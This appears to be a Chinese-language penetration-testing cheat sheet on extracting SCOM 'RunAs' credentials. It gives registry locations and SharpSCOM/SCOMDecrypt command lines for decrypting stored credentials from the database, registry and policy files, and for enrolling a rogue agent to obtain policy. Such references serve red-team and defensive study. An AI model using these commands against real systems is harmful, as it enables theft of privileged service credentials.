# 部署 - SCOM

> Microsoft SCOM（System Center Operations Manager）是一款监控工具，用于监视 IT 环境中服务器、应用程序和基础设施的健康状况和性能。它从系统收集数据，为问题生成告警，并为管理员提供仪表板和报告。

## 工具

* [breakfix/SharpSCOM](https://github.com/breakfix/SharpSCOM) - 用于与 SCOM 交互的 C# 工具。
* [nccgroup/SCOMDecrypt](https://github.com/nccgroup/SCOMDecrypt) - SCOMDecrypt 是一款从 SCOM 服务器解密存储的 RunAs 凭据的工具。

## SCOM "RunAs" 凭据

### 从 SCOM 数据库恢复

可以通过查询以下注册表键来找到包含 RunAs 凭据的 SCOM 数据库位置：

```ps1
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\System Center\2010\Common\Database\DatabaseServerName
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\System Center\2010\Common\Database\DatabaseName
```

解密 SCOM 管理服务器数据库中存储的凭据：

```ps1
.\SCOMDecrypt.exe
powershell-import C:\path\to\SCOMDecrypt.ps1
powershell Invoke-SCOMDecrypt
```

### 通过注册表恢复

存储在 `HKLM\SYSTEM\CurrentControlSet\Services\HealthService\Parameters\Management Groups\$MANAGEMENT_GROUP$\SSDB\SSIDs\`。

```ps1
.\SharpSCOM.exe DecryptRunAs
```

### 通过策略文件恢复

使用 DPAPI 从策略中解密 RunAs 凭据。

```ps1
cat C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Connector Configuration Cache\$MANAGEMENT_GROUP_NAME$\OpsMgrConnector.Config
SharpSCOM DecryptPolicy /data:<base64-encrypted-data>
```

### 注册新代理后恢复

**前提条件**：

* 管理组名称：`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\HealthService\Parameters\Management Groups\*`

```ps1
SharpSCOM.exe autoenroll /managementgroup:SCOM1 /server:scom.domain.lab /hostname:fake1.domain.lab /outfile:C:\Users\admin\desktop\policy_new.xml

# 注册新代理后，攻击者可以解密策略
SharpSCOM.exe decryptpolicy /data:"DAEAAA<REDACTED> /key:<RSAKeyValue><Modulus><REDACTED></D></RSAKeyValue>
```

## 参考资料

* [SCOMmand And Conquer – Attacking System Center Operations Manager (Part 2) - Matt Johnson - December 10, 2025](https://specterops.io/blog/2025/12/10/scommand-and-conquer-attacking-system-center-operations-manager-part-2/)
* [SCOMplicated? – Decrypting SCOM "RunAs" credentials - Rich Warren - February 23, 2017](https://www.nccgroup.com/research-blog/scomplicated-decrypting-scom-runas-credentials/)
